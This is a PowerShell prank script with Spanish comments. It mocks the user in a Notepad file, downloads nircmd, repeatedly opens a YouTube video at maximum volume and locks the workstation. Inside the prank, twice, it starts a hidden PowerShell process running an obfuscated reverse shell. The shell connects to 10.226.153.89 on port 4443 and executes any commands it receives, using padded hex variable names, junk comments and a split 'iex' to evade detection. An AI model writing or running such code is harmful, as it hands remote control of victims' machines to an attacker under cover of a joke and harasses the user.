############ ARCHIVO TXT ############
$Temp = $env:TEMP
$User = $env:USERNAME
$file = Join-Path $Temp 'troll.txt'

"$User, tonto el que lo lea" | Set-Content -Path $file -Encoding UTF8
Start-Process notepad.exe $file



############ DESCARGAR .EXE QUE SUBE EL VOLUMEN ############
Start-Sleep -Seconds 10

$nirPath = Join-Path $Temp 'nircmd.exe'
if (-not (Test-Path $nirPath)) {
    $zipPath = Join-Path $Temp 'nircmd.zip'
    Invoke-WebRequest -Uri 'https://www.nirsoft.net/utils/nircmd.zip' -OutFile $zipPath
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $Temp)
}



############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"

Start-Process $PSHOME\powershell.exe -ArgumentList {$e9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092d = NeW-ObJEcT <# 953c556fd0454b2d8e928a20bab1e922ebf3ed897bc34740bff83191c335bcd7a366306f7d7f4ddd864cf1587f8f8c325d871738f1a547c4876ea92930ecdf665fba9549e90947a3a26873c1ff06c107b1b80fa675ad42f99e0f89eda4455025104631148ad6490cb15323a022fdcba5ba95eddd2c6b4c2284e32edfecea7875787fc065d1a948948358436f725896de56b54baf00ad479dad0d0e3da0c5f9b0 #> SyStEM.NeT.SoCKetS.TCPClient('10.226.153.89',4443)<# 9b5041ea1536461f922167f9bee7666e45fc10b4f14847c4fe477cadeac616f503d09e48f570eb3b548aea61fe1788a0ff18500c05a90c445490da7c10d39cb59a504885d11fce65841a7945b60b8d9684007a3cd3d99642ba49a3aabb2fc8fba880de6a0237a3338045699138132741655876a1d255328b7e4c518c9eea4d7c07e201168b4a8e39384f7b85bda2a4d452f7ae1030584e58b94564bb206be986dbf521c57c954319a16bfcdfae16453a #>;$416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673 = $e9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092d.GetStream() <# 4067ef26980c4945a13f05c600e13233f57df9a631ac49bf9f98543c6bf27de6 #>;[byte[]]$71d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5 = 0..65535|%{0};while(($i = $416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673.Read($71d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5, 0, $71d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5.LeNGtH)) -ne 0){;$d21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603d = (NeW-ObJEct <# dd74d173407a472eaedd958f0bee42984d4d38fa68554eada2a76067d07728f4 #> -TyPeNamE System.Text.ASCIIEncoding).GetString($71d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5,0, $i);$aaaaaaaaaaffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff = (i''e""x $d21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603d 2>&1 | Out-String );$fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff = $aaaaaaaaaaffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + 'PS ' + $($p = (Split-Path `"$(pwd)\\0x00\`");if ($p.trim() -eq ''){echo 'C:\'}else{echo $p}) + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);$416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673.Write($sendbyte,0,$sendbyte.Length);$416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673.Flush() <# 2dd2765092f244239d739aebfe1d24114f75662cd7ad443380010ab9fe93ee32c4b26058f934e58ba4fe667de2e8733d4fae14dadfc4977b16019222b2156e485b3cf4b93a54ac4a26edcaa12851492546371f0f5d54030adc47590d5b48038f09190651a2d432aa0f49933246f22854c50f873cab04fc29b5131154d67b9daef9d0547fc3f43ba90debfd22eabdc0b1023abecb72545cca3b6bd8f73018ad992f4b089957d4fbbb61b63da453cfb91c7886c07ba384428885349a4374c30486 #>};$e9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092d.Close()} -WindowStyle Hidden 

Start-Sleep -Milliseconds 1500

& $nirPath mutesysvolume 0
& $nirPath setsysvolume 65535

Start-Process rundll32.exe 'user32.dll,LockWorkStation'

Start-Sleep -Seconds 4



############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"

& $nirPath mutesysvolume 0
& $nirPath setsysvolume 65535

Start-Process rundll32.exe 'user32.dll,LockWorkStation'

Start-Sleep -Seconds 4



############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
Start-Process $PSHOME\powershell.exe -ArgumentList {$e9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092d = NeW-ObJEcT <# 953c556fd0454b2d8e928a20bab1e922ebf3ed897bc34740bff83191c335bcd7a366306f7d7f4ddd864cf1587f8f8c325d871738f1a547c4876ea92930ecdf665fba9549e90947a3a26873c1ff06c107b1b80fa675ad42f99e0f89eda4455025104631148ad6490cb15323a022fdcba5ba95eddd2c6b4c2284e32edfecea7875787fc065d1a948948358436f725896de56b54baf00ad479dad0d0e3da0c5f9b0 #> SyStEM.NeT.SoCKetS.TCPClient('10.226.153.89',4443)<# 9b5041ea1536461f922167f9bee7666e45fc10b4f14847c4fe477cadeac616f503d09e48f570eb3b548aea61fe1788a0ff18500c05a90c445490da7c10d39cb59a504885d11fce65841a7945b60b8d9684007a3cd3d99642ba49a3aabb2fc8fba880de6a0237a3338045699138132741655876a1d255328b7e4c518c9eea4d7c07e201168b4a8e39384f7b85bda2a4d452f7ae1030584e58b94564bb206be986dbf521c57c954319a16bfcdfae16453a #>;$416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673 = $e9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092d.GetStream() <# 4067ef26980c4945a13f05c600e13233f57df9a631ac49bf9f98543c6bf27de6 #>;[byte[]]$71d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5 = 0..65535|%{0};while(($i = $416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673.Read($71d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5, 0, $71d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5.LeNGtH)) -ne 0){;$d21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603d = (NeW-ObJEct <# dd74d173407a472eaedd958f0bee42984d4d38fa68554eada2a76067d07728f4 #> -TyPeNamE System.Text.ASCIIEncoding).GetString($71d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5,0, $i);$aaaaaaaaaaffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff = (i''e""x $d21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603d 2>&1 | Out-String );$fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff = $aaaaaaaaaaffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + 'PS ' + $($p = (Split-Path `"$(pwd)\\0x00\`");if ($p.trim() -eq ''){echo 'C:\'}else{echo $p}) + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);$416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673.Write($sendbyte,0,$sendbyte.Length);$416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673.Flush() <# 2dd2765092f244239d739aebfe1d24114f75662cd7ad443380010ab9fe93ee32c4b26058f934e58ba4fe667de2e8733d4fae14dadfc4977b16019222b2156e485b3cf4b93a54ac4a26edcaa12851492546371f0f5d54030adc47590d5b48038f09190651a2d432aa0f49933246f22854c50f873cab04fc29b5131154d67b9daef9d0547fc3f43ba90debfd22eabdc0b1023abecb72545cca3b6bd8f73018ad992f4b089957d4fbbb61b63da453cfb91c7886c07ba384428885349a4374c30486 #>};$e9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092d.Close()} -WindowStyle Hidden 
Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"

& $nirPath mutesysvolume 0
& $nirPath setsysvolume 65535

Start-Process rundll32.exe 'user32.dll,LockWorkStation'

Start-Sleep -Seconds 4



############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"

& $nirPath mutesysvolume 0
& $nirPath setsysvolume 65535

Start-Process rundll32.exe 'user32.dll,LockWorkStation'

Start-Sleep -Seconds 4



# ############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
# Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"

# & $nirPath mutesysvolume 0
# & $nirPath setsysvolume 65535

# Start-Process rundll32.exe 'user32.dll,LockWorkStation'

# Start-Sleep -Seconds 4



# ############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
# Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"

# & $nirPath mutesysvolume 0
# & $nirPath setsysvolume 65535

# Start-Process rundll32.exe 'user32.dll,LockWorkStation'

# Start-Sleep -Seconds 4



# ############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
# Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"

# & $nirPath mutesysvolume 0
# & $nirPath setsysvolume 65535

# Start-Process rundll32.exe 'user32.dll,LockWorkStation'

# Start-Sleep -Seconds 4



# ############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
# Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"

# & $nirPath mutesysvolume 0
# & $nirPath setsysvolume 65535

# Start-Process rundll32.exe 'user32.dll,LockWorkStation'

# Start-Sleep -Seconds 4



# ############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
# Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"

# & $nirPath mutesysvolume 0
# & $nirPath setsysvolume 65535

# Start-Process rundll32.exe 'user32.dll,LockWorkStation'

# Start-Sleep -Seconds 4



# ############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
# Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"

# & $nirPath mutesysvolume 0
# & $nirPath setsysvolume 65535

# Start-Process rundll32.exe 'user32.dll,LockWorkStation'

# Start-Sleep -Seconds 4